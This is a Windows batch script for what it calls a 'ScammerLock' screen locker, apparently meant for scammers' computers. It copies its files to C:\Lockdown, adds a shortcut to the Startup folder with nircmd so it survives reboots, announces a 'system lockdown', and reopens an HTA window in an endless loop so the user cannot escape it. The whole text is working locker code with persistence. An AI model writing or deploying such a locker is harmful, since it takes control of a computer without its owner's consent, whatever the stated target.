@echo off
cls

if exist "C:\Lockdown" (
    del /S C:\Lockdown\*
    rmdir C:\Lockdown
)

mkdir C:\Lockdown
copy ldstartup.bat C:\Lockdown > nul
copy index.hta C:\Lockdown > nul
copy background.png C:\Lockdown > nul
rem Remember to change "background.png" to the background image you want to use.
rem You will need to add code to copy all the used images to C:\Lockdown.
nircmd.exe shortcut "C:\Lockdown\ldstartup.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" "ScammerLock-HTA"

echo Initiating system lockdown...
echo Lockdown mode is now active.

:open
start "" /wait "index.hta"
goto :open

